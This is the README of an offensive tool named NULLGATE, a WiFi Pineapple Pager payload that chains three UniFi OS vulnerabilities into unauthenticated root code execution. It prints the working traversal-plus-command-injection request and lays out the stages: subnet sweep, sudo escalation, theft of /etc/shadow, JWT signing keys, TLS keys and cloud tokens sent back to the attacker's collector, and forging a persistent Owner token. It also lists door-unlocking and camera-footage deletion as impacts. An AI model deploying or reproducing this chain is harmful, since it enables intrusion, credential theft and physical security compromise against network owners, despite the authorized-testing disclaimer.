# NULLGATE

**Unauthenticated root RCE against UniFi OS consoles, from the WiFi Pineapple Pager.**

NULLGATE is a Pager-native port of the 2026 UniFi OS root chain
(CVE-2026-34908 + CVE-2026-34909 + CVE-2026-34910, CVSS 10.0 each, CISA KEV,
actively exploited in the wild). One unauthenticated HTTPS request bypasses
the nginx auth gateway, reaches an internal command-injection sink, and gives
code execution as `ucs-update`. From there NULLGATE escalates with the
service account's passwordless `sudo`, dumps the console's secret store, and
forges an `Owner` session token that keeps working after the target patches.

Everything is implemented with the Python 3 standard library — no
cross-compilation, no extra packages, no HackRF, and no monitor radio.

> **AUTHORIZED TESTING ONLY.** This payload performs real exploitation. Use it
> only against consoles you own or have explicit written permission to test.

---

## The bug

nginx authorizes a request using the **raw** request-target but routes it
using the **normalized** one. The auth handler treats any path starting with
`/api/auth/validate-sso/` as public, while the router percent-decodes `%2f`
and collapses `../`. Encoding a traversal makes the two disagree:

```text
GET /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=evil;<CMD>&by_cmd=true
```

`pkg_name` is interpolated verbatim into `sudo systemctl stop <pkg_name>` and
run through `sh -c`, so `evil;<CMD>` escapes the systemctl argument. The same
primitive against `/app-assets/...` gives arbitrary file read
(CVE-2026-34909).

NULLGATE sends the request-target **verbatim** through `http.client`; any
client that normalizes `..%2f` breaks the exploit.

---

## Hard constraints (read before deploying)

| Constraint | Detail |
|---|---|
| Target | UniFi OS Server ≤ 5.0.6, or UniFi OS hardware console ≤ 5.1.11, setup wizard completed |
| Patched hosts | Return HTTP 400 to the bypass and are reported `PATCHED`, never exploited |
| Reachability | The Pager needs L3 access to the console on **TCP 11443** — join the target WiFi with `wlan0cli` or wire in over USB-C |
| Execution context | RCE starts as `ucs-update`; root needs passwordless `sudo chmod`/`dpkg`. Not every secret may be readable on every build |
| Blind endpoint | HTTP 200 does **not** prove execution. A stage is `CONFIRMED` only when the target calls back to the Pager with the matching nonce |
| TLS | Self-signed certificates; verification is disabled by design |
| Validation | No live vulnerable console was available during development. Request mechanics and the whole chain are tested against a faithful local mock, not a real appliance |
| Blockers | WPA3/PMF, client isolation/VLANs, patched firmware, or no route to 11443 |

---

## Impact

- **Credentials / loot** — JWT signing key, TLS private keys, cloud tokens,
  RADIUS/WiFi/VPN secrets, NFC/card data, `/etc/shadow`, PostgreSQL user store.
- **Code execution** — root via one unauthenticated request plus the
  over-privileged service account.
- **Physical access** — with UniFi Access / Protect deployed, the owner scope
  can unlock doors, view or disable cameras, and delete footage.
- **Network access** — push configs, rewrite firewall/routing/DNS, create
  admins, adopt/de-adopt devices, and pivot through cloud tokens to other sites.

---

## What the payload actually does

1. **Authorize** — explicit operator confirmation; a capability check runs first.
2. **Discover** — sweep the local `/24` for TCP 11443, then fingerprint each hit.
3. **Probe** — Bishop Fox's non-destructive check: reaches the handler without
   running a command. Verdicts: `VULNERABLE`, `PATCHED`, `INCONCLUSIVE`,
   `UNAFFECTED`.
4. **Exploit / Proof** — injects a script that writes a marker and calls back.
   Confirmed only by callback.
5. **Loot** — escalates with passwordless `sudo chmod`, copies the secret
   store, and POSTs a base64 tarball back to the Pager's collector.
6. **Persist** — re-signs a token with the stolen HS256 key (alg/iss/aud are
   not pinned) and tests it against an authenticated API endpoint. Confirmed
   only if the target accepts it.

### Honest status

`exploit.jsonl` records `http_status` and `callback_confirmed` separately.
The UI shows `SENT`, `UNCONFIRMED`, or `CONFIRMED` — it never renders a
"success" the target did not prove.

---

## Install

Copy the whole `nullgate/` folder to a Pager payload directory, e.g.:

```text
/root/payloads/user/exfiltration/nullgate/
```

or deploy the release zip through the Pager payload manager. The folder must
contain `payload.sh`, `nullgate.py`, and `sd/`.

Requirements: `python3-light` only. Nothing is installed to `/mmc`.

---

## Use

1. Give the Pager network access to the target LAN (`wlan0cli` association or
   USB-C Ethernet).
2. Launch **NULLGATE** from the Pager payload menu and accept the warning.
3. In the UI:
   - **AUTH** — press `A` to authorize.
   - **TGT** — press `A` to sweep, `U/D` to select, `A` to choose a console.
   - **PROBE** — press `A` for the safe probe. Only `VULNERABLE` proceeds.
   - **OWN** — `U/D` picks a stage, `A` executes:
     1. `proof` — confirm RCE by callback
     2. `loot` — dump the secret store
     3. `persist` — forge and test an owner token
   - **LOOT** — press `A` for a file-read demonstration.
4. Stop the payload with the power button; loot stays on the device.

---

## Loot

```text
/root/loot/nullgate/
├── nullgate.log
├── exploit.jsonl                 one record per injection attempt
├── reads.jsonl                   arbitrary file-read results
└── dump_<nonce>/
    ├── shadow
    └── config/jwt.yaml           (and the rest of the copied config tree)
```

---

## Testing (hardware-free)

```bash
python3 -m unittest discover -s tests -v   # 23 tests, incl. end-to-end mock
python3 nullgate.py capcheck               # stdlib/TLS/URI primitives
python3 nullgate.py selftest               # engine smoke test
python3 sd/ui.py --headless --sample --frames 5
```

The test suite stands up a local mock console that reproduces the auth
bypass, the injection sink, and a real callback from a simulated target — so
confirmation logic is exercised end to end without exploiting anything.

---

## Files

| Path | Purpose |
|---|---|
| `payload.sh` | Launcher, auth gate, LED handling, loot setup |
| `nullgate.py` | Entry point (`engine`, `selftest`, `capcheck`, `probe`) |
| `sd/net.py` | Verbatim-URI transport, safe probe, injection, file read |
| `sd/attack.py` | Shell-script builders, HS256 token forge |
| `sd/discovery.py` | Local subnet sweep and console fingerprinting |
| `sd/collector.py` | Nonce callback listener and loot unpacking |
| `sd/engine.py` | State machine, honesty rules, loot logging |
| `sd/ui.py` | 480x222 Pager UI |
| `tests/` | Hardware-free test suite |

---

## References

- [Bishop Fox — Popping Root on UniFi OS Server](https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis)
- [Bishop Fox detector](https://github.com/BishopFox/CVE-2026-34908-check)
- [Public PoC](https://github.com/Boreas37/CVE-2026-34910-PoC)
- [Ubiquiti SAB-064](https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b)

## License

GPLv3 — see [LICENSE](LICENSE).
